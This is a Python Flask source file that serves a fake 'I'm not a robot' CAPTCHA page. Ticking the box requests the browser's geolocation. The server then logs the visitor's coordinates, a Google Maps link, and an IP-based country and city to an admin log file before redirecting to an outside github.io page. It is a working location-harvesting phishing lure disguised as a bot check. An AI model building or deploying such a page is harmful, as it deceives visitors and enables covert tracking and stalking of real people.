from flask import Blueprint, request, render_template_string, redirect
from datetime import datetime
import requests

main = Blueprint('main', __name__)

html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>I'm not a robot</title>
    <script>
        function validateForm() {
            var checkBox = document.getElementById("not_a_robot");
            if (!checkBox.checked) {
                alert("Please check the 'I'm not a robot' checkbox.");
                return false;
            }
            return true;
        }

        function submitForm() {
            if (validateForm()) {
                navigator.geolocation.getCurrentPosition(success, error);
            }
        }

        function success(position) {
            var latitude = position.coords.latitude;
            var longitude = position.coords.longitude;
            var form = document.getElementById("location_form");
            form.latitude.value = latitude;
            form.longitude.value = longitude;
            form.submit();
        }

        function error() {
            alert("Unable to retrieve your location");
            var form = document.getElementById("location_form");
            form.submit();
        }

        window.onload = function() {
            document.getElementById("location_form").onsubmit = function(e) {
                e.preventDefault();
                submitForm();
            };
        };
    </script>
</head>
<body>
    <form id="location_form" action="/submit" method="post">
        <label>
            <input type="checkbox" id="not_a_robot" name="not_a_robot">
            I'm not a robot
        </label>
        <input type="hidden" name="latitude" value="">
        <input type="hidden" name="longitude" value="">
        <br>
        <button type="submit">Submit</button>
    </form>
</body>
</html>
"""

@main.route('/')
def index():
    return render_template_string(html_template)

@main.route('/submit', methods=['POST'])
def submit():
    if 'not_a_robot' not in request.form:
        return "Checkbox not checked!"

    latitude = request.form.get('latitude', 'Unknown')
    longitude = request.form.get('longitude', 'Unknown')

    try:
        # Get public IP using ipify
        user_ip = requests.get('https://api.ipify.org').text
    except requests.RequestException:
        user_ip = 'Unknown'

    try:
        # Get detailed location info using ip-api
        geo_data = requests.get(f'http://ip-api.com/json/{user_ip}').json()
        country = geo_data.get('country', 'Unknown')
        city = geo_data.get('city', 'Unknown')
        google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"
    except requests.RequestException:
        country = 'Unknown'
        city = 'Unknown'
        google_maps_link = 'Unknown'

    # Log data to admin_log.txt
    with open("admin_log.txt", "a") as log_file:
        log_file.write(f"Time: {datetime.now()}, IP: {user_ip}, Country: {country}, City: {city}, Latitude: {latitude}, Longitude: {longitude}, Google Maps: {google_maps_link}\n")

    # Redirect to the provided URL
    return redirect("https://fivegaming24.github.io/open.html")
